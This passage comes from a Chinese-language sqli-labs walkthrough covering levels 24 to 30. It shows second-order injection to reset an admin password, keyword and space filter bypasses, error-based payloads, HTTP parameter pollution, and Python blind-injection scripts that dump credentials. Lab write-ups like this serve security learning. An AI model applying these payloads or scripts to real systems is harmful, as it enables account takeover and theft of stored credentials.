class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line"><span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line"><span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mysql_real_escape_string</code> 转义 <code>SQL</code> 语句中使用的字符串中的特殊字符，所以此时是不可以直接在登录页上进行注入的；那就要寻找其他注入点，</p><h3 id="为什么注册页面不可以直接注入？"><a href="#为什么注册页面不可以直接注入？" class="headerlink" title="为什么注册页面不可以直接注入？"></a>为什么注册页面不可以直接注入？</h3><p>可利用部分没有查询语句，只有插入语句……</p><h3 id="为什么注册功能可以成功写入特殊字符？"><a href="#为什么注册功能可以成功写入特殊字符？" class="headerlink" title="为什么注册功能可以成功写入特殊字符？"></a>为什么注册功能可以成功写入特殊字符？</h3><p>本题还有两个链接，一个是忘记密码（没什么luan用，还有一张极为不爽的图），还有一个就是注册用户，拿出注册的源码来看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;</span><br><span class="line">$pass= mysql_escape_string($_POST[&apos;password&apos;]);</span><br><span class="line">$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);</span><br></pre></td></tr></table></figure><p>这里对输入的账户和密码进行了特殊字符转义处理，即在特殊字符前面加上<code>\</code>，但是在加上转义符号以后，写入数据库时，写入进去的数据是没有<code>\</code>的，如下所示：</p><p><img src="https://i.loli.net/2019/06/29/5d175163534d483323.png" alt=""></p><p>插入时<code>&#39;</code>是带了转义符号的，但是插入以后查询却显示没有转义符号，所以这就给二次注入留下了机会；</p><h3 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入?"></a>什么是二次注入?</h3><blockquote><p>二次注入也称为存储型注入，就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p></blockquote><p>1.这里我们创建新账户<code>admin&#39;#</code>，虽然在写入时<code>#</code>会被转义，但是写入数据库里的还是原来的符号，并没有添加转义符号，所以这里可以成功写入用户名<code>admin&#39;#</code>；</p><p>2.我们拿<code>admin&#39;#</code>用户登录，看到回显的是修改密码的页面，</p><p><img src="https://i.loli.net/2019/06/29/5d1750f8ef7d942666.png" alt=""></p><p>审计修改密码的源码，发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br></pre></td></tr></table></figure><p><code>username</code>没有做任何过滤和转义，这里的session里的用户名就是当前维持会话的用户<code>admin#</code>，</p><p>3.寻找注入点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure><p>这里输入的<code>username</code>为<code>admin#</code>会直接将后面的内容注释掉，所以形成的最后的语句就是：</p><p><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></p><p>此时就会将真的<code>admin</code>用户的密码修改为这里的<code>$pass</code>，这样的话就可以直接拿修改密码后的<code>admin</code>用户来登录，拿到<code>admin</code>的账户了；</p><p><img src="https://i.loli.net/2019/06/29/5d1751fd4924141073.png" alt=""></p><h2 id="less-25-and-or过滤，字符型"><a href="#less-25-and-or过滤，字符型" class="headerlink" title="less-25(and/or过滤，字符型)"></a>less-25(and/or过滤，字符型)</h2><p>初步测试发现是单引号字符型注入，继续测试，从hint发现<code>and</code>和<code>or</code>都被过滤了，尝试双写，绕过成功…也可以使用<code>||和&amp;&amp;</code>绕过</p><p><img src="https://i.loli.net/2019/06/29/5d175ee7c64cb28731.png" alt=""></p><p>具体的绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.&amp;&amp; ||</span><br><span class="line">2.大小写变形Or,OR,oR</span><br><span class="line">3.编码，例如hex，urlencode</span><br><span class="line">4.添加注释/*or*/</span><br><span class="line">5.利用符号and=&amp;&amp; or=||</span><br><span class="line">6.双写绕过</span><br></pre></td></tr></table></figure><p>接下来就是常规操作</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),group_concat(passwoorrd) from users--+</span><br></pre></td></tr></table></figure><p>也可报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; %26%26 updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>查看源码危险的过滤函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line"></span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="less-25a-and-or过滤，数字型，blind"><a href="#less-25a-and-or过滤，数字型，blind" class="headerlink" title="less-25a(and/or过滤，数字型，blind)"></a>less-25a(and/or过滤，数字型，blind)</h2><p>初步测试发现为数字型注入，过滤掉了<code>and</code>和<code>or</code>，双写绕过……</p><p><img src="https://i.loli.net/2019/06/29/5d175fbff327831362.png" alt=""></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(username),group_concat(passwoorrd) from users</span><br></pre></td></tr></table></figure><h2 id="less-26-空格-注释过滤，字符型"><a href="#less-26-空格-注释过滤，字符型" class="headerlink" title="less-26(空格/注释过滤，字符型)"></a>less-26(空格/注释过滤，字符型)</h2><p>fuzz半天没出来，直接查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #</span><br><span class="line">$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);//Strip out spaces</span><br><span class="line">$id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);//Strip out slashes</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤掉了…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or and /* -- # 空格  \ /</span><br></pre></td></tr></table></figure><p>过滤掉注释符号只有一种办法解决，那就是构造如下语句闭合句末的引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>过滤掉空格是一件非常头疼的事情，下面重点探讨一下空格的绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br><span class="line">%20 urlencode</span><br><span class="line">/**/ 注释</span><br></pre></td></tr></table></figure><p>这里使用<code>%a0</code>来绕过</p><p>报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%a0%26%26%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0||%271%27=%271</span><br></pre></td></tr></table></figure><h2 id="less-26a-空格-注释过滤，字符型，blind"><a href="#less-26a-空格-注释过滤，字符型，blind" class="headerlink" title="less-26a(空格/注释过滤，字符型，blind)"></a>less-26a(空格/注释过滤，字符型，blind)</h2><p>这题对比26的区别就是不能报错注入，那就直接盲注吧，直接上盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/Less-26a/"</span></span><br><span class="line">payload=<span class="string">"?id=1')%a0aandnd%a0ascii(substr(database(),&#123;len&#125;,1))=&#123;ascii&#125;%a0%26%26%a0('1'='1"</span></span><br><span class="line">database_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">database_name+=chr(j)</span><br><span class="line">print(database_name)</span><br></pre></td></tr></table></figure><h2 id="less-27-select-union绕过，字符型"><a href="#less-27-select-union绕过，字符型" class="headerlink" title="less-27(select/union绕过，字符型)"></a>less-27(select/union绕过，字符型)</h2><p>黑名单继续添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);    //Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一次直接将联合查询过滤了，查询也不能用，<code>union select</code>都过滤了，而且<code>select</code>还过滤了两次，直接双写绕过或者大小写混写即可</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27%a0uniounionn%a0selecselecselecttt%a02,(selecselecselecttt%a0group_concat(username)%a0from%a0users),4%a0||%a0%271%27=%271</span><br></pre></td></tr></table></figure><p>或者直接报错注入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and%271%27=%271</span><br></pre></td></tr></table></figure><h2 id="less-27a-select-union绕过-字符型"><a href="#less-27a-select-union绕过-字符型" class="headerlink" title="less-27a(select/union绕过,字符型)"></a>less-27a(select/union绕过,字符型)</h2><p>区别就是双引号</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%22%a0uniunionon%a0selecselecselecttt%a02,(selecselecselecttt%a0group_concat(password)from%a0users),4||%221%22=%221</span><br></pre></td></tr></table></figure><p>很久没写盲注脚本了，给出一个exp吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/Less-27a/"</span></span><br><span class="line">ans=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_database</span><span class="params">()</span>:</span></span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line">payload1=<span class="string">'?id=1"%a0and%a0ascii(substr(database(),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload1.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">database_name+=chr(j)</span><br><span class="line"><span class="comment"># print(database_name)</span></span><br><span class="line">ans.update(databasename=database_name)</span><br><span class="line"><span class="comment"># return database_name</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_tables</span><span class="params">()</span>:</span></span><br><span class="line">table=[]</span><br><span class="line">payload2=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0table_name%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">table_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload2.format(num=k,len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table_name+=chr(j)</span><br><span class="line"><span class="keyword">if</span> table_name!=<span class="string">''</span>:</span><br><span class="line"><span class="comment"># print(table_name)</span></span><br><span class="line">table.append(table_name)</span><br><span class="line">ans.update(tablenames=table)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_columns</span><span class="params">(tablename)</span>:</span></span><br><span class="line">column=[]</span><br><span class="line">payload3=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0column_name%a0from%a0information_schema.columns%a0where%a0table_name='</span>+tablename+<span class="string">'%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">column_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload3.format(num=k,len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">column_name+=chr(j)</span><br><span class="line"><span class="keyword">if</span> column_name!=<span class="string">''</span>:</span><br><span class="line"><span class="comment"># print(column_name)</span></span><br><span class="line">column.append(column_name)</span><br><span class="line">ans.update(columnnames=column)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_data</span><span class="params">(choice)</span>:</span></span><br><span class="line">data1=[]</span><br><span class="line">payload4=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0'</span>+choice+<span class="string">'%a0from%a0users%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">user_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url+payload4.format(num=k,len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">user_name+=chr(j)</span><br><span class="line"><span class="keyword">if</span> user_name!=<span class="string">''</span>:</span><br><span class="line"><span class="comment"># print(user_name)</span></span><br><span class="line">data1.append(user_name)</span><br><span class="line">ans.update(data=data1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">print(<span class="string">'[+]Let us start SQL Injection and have fun'</span>)</span><br><span class="line">print(<span class="string">'[+]loading database name......'</span>)</span><br><span class="line">show_database()</span><br><span class="line">print(<span class="string">'[+]Database name:'</span>+ans[<span class="string">'databasename'</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">'\n[+]loading table name......'</span>)</span><br><span class="line">show_tables()</span><br><span class="line">print(<span class="string">'[+]Table names:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'tablenames'</span>]:</span><br><span class="line">print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line">table_temp=input(<span class="string">'\n[+]Please choose one of the tables:'</span>)</span><br><span class="line">t_name=<span class="string">'"'</span>+table_temp+<span class="string">'"'</span></span><br><span class="line">print(<span class="string">'[+]loading column name......'</span>)</span><br><span class="line">show_columns(t_name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'columnnames'</span>]:</span><br><span class="line">print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line">column=input(<span class="string">"\nPlease choose one of the columns:"</span>)</span><br><span class="line">print(<span class="string">"[+]loading data......"</span>)</span><br><span class="line">show_data(column)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'data'</span>]:</span><br><span class="line">print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="less-28-union-空字符-select绕过-字符型"><a href="#less-28-union-空字符-select绕过-字符型" class="headerlink" title="less-28(union+空字符+select绕过,字符型)"></a>less-28(union+空字符+select绕过,字符型)</h2><p>waf:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);    //Strip out UNION &amp; SELECT.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是过滤了<code>/* -- # 空格 union select</code>，这里的正则表达式<code>\s</code>匹配任意空字符，<code>/i</code>表示不区分大小写，但是需要注意的是这里过滤的是<code>union+空白字符+select同时匹配大小写</code>的这一个整体，所以直接使用%a0绕过空格即可，这个整体就不会被识别</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%a0union%a0select%a03,(select%a0group_concat(password)%a0from%a0users),5%a0and(%271%27)=(%271</span><br></pre></td></tr></table></figure><h2 id="less28-a"><a href="#less28-a" class="headerlink" title="less28-a"></a>less28-a</h2><p>waf:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">//$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">//$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">//$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还注释掉这么多…更简单…<del>不知道在搞什么飞机…</del></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%a0union%a0select%a03,(select%a0group_concat(password)%a0from%a0users),5%a0and(%271%27)=(%271</span><br></pre></td></tr></table></figure><h2 id="less-29-HTTP参数污染"><a href="#less-29-HTTP参数污染" class="headerlink" title="less-29(HTTP参数污染)"></a>less-29(HTTP参数污染)</h2><p>只是过来学习一下waf，懒得装tomcat…但还是了解一下原理：</p><p><a href="https://whoimg.com/s/iu8sz" target="_blank" rel="noopener"><img src="https://i.whoimg.com/2019/07/01/iu8sz.png" alt="iu8sz.png"></a></p><p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 waf，由于解析参数机制的不同，我们此处可以利用该原理绕过 WAF 的检测；</p><p>数据解析顺序：tomcat从前往后，apache从后往前</p><p><img src="https://i.whoimg.com/2019/07/01/iuqWR.png" alt="iuqWR.png"></p><p>在login.php中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[&apos;QUERY_STRING&apos;];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//echo $id1;</span><br><span class="line">whitelist($id1);</span><br></pre></td></tr></table></figure><p>经过白名单过滤的就只是tomcat解析到的第一个id参数，但是如果传入两个id参数，tomcat的过滤效果自然就灰飞烟灭……apache直接解析最后一个id，没有任何waf，轻松注入，该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击。HPP 可对服务器和客户端都能够造成一定的威胁。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>同29，只是改变为双引号</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 